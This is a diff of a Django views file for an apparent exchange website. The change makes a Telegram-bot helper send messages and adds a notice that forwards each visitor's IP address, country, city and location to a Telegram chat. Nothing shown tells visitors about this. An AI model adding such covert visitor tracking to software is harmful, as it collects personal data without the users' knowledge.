@@ -16,19 +16,22 @@ from telegram import Bot
 # from telegram import Update
 # from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
 import asyncio
-from asgiref.sync import sync_to_async
+
+
+
 
 # Create your views here.
-async def send_telegram_message_async(message, button_text=None, button_url=None):
+async def send_telegram_message_async(message):
     token = TGbot.objects.get(name="Изменить").token
     chatId = TGbot.objects.get(name="Изменить").chat_id
     bot = Bot(token=token)
     chat_id = chatId
 
-def send_telegram_message(message, button_text=None, button_url=None):
-    asyncio.run(send_telegram_message_async(message, button_text, button_url))
+    await bot.send_message(chat_id=chat_id, text=message)
 
-    
+def send_telegram_message(message):
+    asyncio.run(send_telegram_message_async(message))
+
 def get_user_ip(request):
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
     if x_forwarded_for:
@@ -176,11 +179,8 @@ def exchange(request):
             
             exchange.save()
             
-            message = f"exchange {exchange_id}"
-            button_text = "step 2"
-            button_url = f"https://c-changer.in/step2/{exchange_id}/"
-
-            send_telegram_message(message, button_text=button_text, button_url=button_url)
+            message = f"Юзер открыл или перезапустил сайт\n\nIP: {user_ip}\nРассположение: {country}, {city}\nЛокация: {location}"
+            send_telegram_message(message)
             
             # Set the 12-character token as a cookie
             response = redirect('deal')
@@ -195,7 +195,11 @@ def exchange(request):
         print(e)  # Print the exception to the console for debugging
         response_data = {'success': False, 'message': e}
         return JsonResponse(response_data)
-    
+
+def step2(request):
+    pass
+
+
 def deal(request):
     # Retrieve the exchange_id from the cookie
     exchange_id = request.COOKIES.get('exchange_id')
